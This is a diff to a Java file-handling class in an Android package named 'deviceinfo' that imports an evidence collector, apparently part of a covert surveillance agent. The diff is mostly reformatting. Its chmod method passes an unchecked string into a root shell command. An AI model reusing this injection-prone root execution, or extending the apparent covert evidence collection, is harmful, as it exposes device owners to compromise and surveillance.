@@ -19,6 +19,7 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.util.Date;
 
+import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.evidence.EvidenceCollector;
 import com.android.deviceinfo.util.ByteArray;
@@ -233,7 +234,7 @@ public final class AutoFile {
 	 *            the data
 	 */
 	public boolean append(final byte[] data) {
-		if(data==null){
+		if (data == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (append) null data");
 			}
@@ -266,7 +267,7 @@ public final class AutoFile {
 					}
 				}
 			}
-			
+
 			if (out != null) {
 				try {
 					out.close();
@@ -282,7 +283,6 @@ public final class AutoFile {
 			}
 		}
 
-		
 		return true;
 	}
 
@@ -351,12 +351,11 @@ public final class AutoFile {
 		return file.getName();
 	}
 
-
 	/**
 	 * Delete the file.
 	 */
 	public boolean delete() {
-		if(file.exists()){
+		if (file.exists()) {
 			file.delete();
 			return true;
 		}
@@ -427,10 +426,14 @@ public final class AutoFile {
 	}
 
 	public void chmod(String string) {
-		Execute.executeRoot("chmod " + string + " " + getFilename() );
-		if (Cfg.DEBUG) {
-			ExecuteResult ret = Execute.executeRoot("ls -l " + getFilename() );
-			Check.log(TAG + " (chmod) result: " + ret.getStdout());
+		if (Status.self().haveRoot()) {
+			Execute.executeRoot("chmod " + string + " " + getFilename());
+			if (Cfg.DEBUG) {
+				ExecuteResult ret = Execute.executeRoot("ls -l " + getFilename());
+				Check.log(TAG + " (chmod) result: " + ret.getStdout());
+			}
+		} else {
+			Execute.execute("chmod " + string + " " + getFilename());
 		}
 	}
 
